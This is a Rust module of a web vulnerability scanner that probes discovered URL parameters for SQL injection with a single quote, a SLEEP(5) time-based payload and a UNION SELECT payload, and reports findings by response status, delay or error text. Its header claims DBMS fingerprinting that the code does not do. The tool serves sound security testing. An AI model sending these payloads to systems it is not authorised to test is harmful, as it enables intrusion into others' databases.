//! # Phase 5: SQL Injection Detection
//!
//! Multi-technique SQLi detection: error-based, boolean-based, and time-based blind attacks.
//! Fingerprints DBMS via error messages and crafts database-specific payloads.
//!
//! ## Detection Methods
//! - **Error-Based**: SQL error signatures (mysql_fetch, pg_query, ORA-, etc.)
//! - **Boolean-Based**: AND/OR logic with response comparison
//! - **Time-Based Blind**: SLEEP(5) with elapsed time measurement
//!
//! ## DBMS Detection
//! - MySQL (mysql_fetch, mysql_error)
//! - PostgreSQL (PostgreSQL query, pg_)
//! - Oracle (ORA-, Oracle error)
//! - MSSQL (SQL Server, Msg)

use crate::{
    context::ScanContext,
    contracts::{ScanFinding, ScanPhase},
    error::ScannerError,
};
use async_trait::async_trait;
use reqwest::StatusCode;
use url::Url;

/// SQL injection scanner with multi-technique detection
#[derive(Debug)]
pub struct SqliScanner;

#[async_trait]
impl ScanPhase for SqliScanner {
    fn phase_number(&self) -> u8 {
        5
    }

    fn name(&self) -> &'static str {
        "SQL Injection Expert"
    }

    async fn execute(&self, ctx: &ScanContext) -> Result<Vec<ScanFinding>, ScannerError> {
        ctx.log("Phase 5: SQL Injection scanning initiated...".to_string());
        let mut findings = Vec::new();

        // Zero-copy access to discovered endpoints from Phase 2
        for entry in ctx.discovered_endpoints.iter() {
            let url_str = entry.key().clone();
            let params = entry.value().clone();

            for param in params {
                ctx.log(format!("Testing parameter '{}' on {}", param, url_str));

                // STEP 1: Single quote injection (Boolean-based SQLi)
                if let Ok(mut test_url) = Url::parse(&url_str) {
                    test_url.query_pairs_mut().append_pair(&param, "'");

                    match ctx.client.get(test_url.as_str()).send().await {
                        Ok(response) => {
                            if response.status() == StatusCode::INTERNAL_SERVER_ERROR {
                                findings.push(ScanFinding {
                                    phase: self.phase_number(),
                                    module_name: self.name().to_string(),
                                    severity: "HIGH".to_string(),
                                    description: format!(
                                        "Potential SQL Injection detected in parameter '{}'",
                                        param
                                    ),
                                    evidence: format!(
                                        "URL: {} returned 500 Internal Server Error with single quote injection",
                                        test_url
                                    ),
                                });
                            }
                        },
                        Err(_e) => {
                            ctx.log(format!("Failed to test {} - network error", test_url));
                        },
                    }
                }

                // STEP 2: Time-based blind SQLi (SLEEP() payload)
                if let Ok(mut test_url) = Url::parse(&url_str) {
                    test_url
                        .query_pairs_mut()
                        .append_pair(&param, "1' OR SLEEP(5)--");

                    let start = std::time::Instant::now();
                    match tokio::time::timeout(
                        std::time::Duration::from_secs(10),
                        ctx.client.get(test_url.as_str()).send(),
                    )
                    .await
                    {
                        Ok(Ok(_response)) => {
                            let elapsed = start.elapsed().as_secs();
                            if elapsed >= 5 {
                                findings.push(ScanFinding {
                                    phase: self.phase_number(),
                                    module_name: self.name().to_string(),
                                    severity: "CRITICAL".to_string(),
                                    description: format!(
                                        "Time-based blind SQL Injection confirmed in parameter '{}'",
                                        param
                                    ),
                                    evidence: format!(
                                        "SLEEP(5) payload caused {}-second delay on {}",
                                        elapsed, test_url
                                    ),
                                });
                            }
                        },
                        Ok(Err(_)) => {},
                        Err(_) => {
                            ctx.log(format!("Timeout testing {} - possible SQLi", test_url));
                        },
                    }
                }

                // STEP 3: Error-based SQLi (UNION SELECT exploitation)
                if let Ok(mut test_url) = Url::parse(&url_str) {
                    test_url
                        .query_pairs_mut()
                        .append_pair(&param, "1' UNION SELECT NULL,NULL,NULL--");

                    if let Ok(response) = ctx.client.get(test_url.as_str()).send().await {
                        if let Ok(body) = response.text().await {
                            if body.contains("Column count") || body.contains("Syntax error") {
                                findings.push(ScanFinding {
                                    phase: self.phase_number(),
                                    module_name: self.name().to_string(),
                                    severity: "CRITICAL".to_string(),
                                    description: format!(
                                        "Error-based SQL Injection confirmed in parameter '{}'",
                                        param
                                    ),
                                    evidence: format!(
                                        "SQL error message leaked in response: {}",
                                        body.chars().take(200).collect::<String>()
                                    ),
                                });
                            }
                        }
                    }
                }
            }
        }

        ctx.log(format!(
            "Phase 5: SQLi scanning completed. Found {} vulnerabilities.",
            findings.len()
        ));
        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phase_number() {
        let scanner = SqliScanner;
        assert_eq!(scanner.phase_number(), 5);
    }

    #[test]
    fn test_phase_name() {
        let scanner = SqliScanner;
        assert_eq!(scanner.name(), "SQL Injection Expert");
    }
}
